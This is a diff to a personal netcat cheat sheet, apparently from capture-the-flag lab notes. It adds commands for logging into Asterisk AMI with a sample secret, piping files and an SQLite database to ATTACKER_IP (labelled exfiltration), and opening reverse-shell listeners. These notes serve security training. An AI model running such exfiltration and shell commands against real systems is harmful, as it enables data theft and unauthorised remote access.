@@ -85,3 +85,38 @@ Used on: **OperationTakeover** - opened the FRRouting VTY console to fingerprint
 
 - `-v` — verbose; shows the connect banner (FRR version string, password prompt)
 - Port `2623` is FRR's default VTY; classic IOS uses `23` (telnet)
+
+### Connect to Asterisk AMI
+```bash
+nc $TARGET 5038
+ACTION: login
+USERNAME: admin
+SECRET: abc123
+```
+Used on: **Aster** - logged into Asterisk Manager Interface after Hydra recovered the AMI secret.
+
+### Transfer files over raw TCP
+```bash
+# Receiver
+nc -lvnp 4444 > uid_checker
+
+# Sender
+cat /uid_checker | nc ATTACKER_IP 4444
+```
+Used on: **davesblog** - copied the sudo-allowed `/uid_checker` binary back to Kali for reversing.
+
+```bash
+# Sender
+nc ATTACKER_IP 80 < /opt/reactorwatch/reactor.db
+
+# Receiver
+nc -lvnp 80 > reactor.db
+```
+Used on: **Reactor** - exfiltrated an SQLite database for offline analysis.
+
+### DevHub reverse-shell listeners
+```bash
+nc -lvnp 4444
+nc -lvnp 5555
+```
+Used on: **DevHub** - received the MCPJam Inspector shell and the later JupyterLab terminal shell.
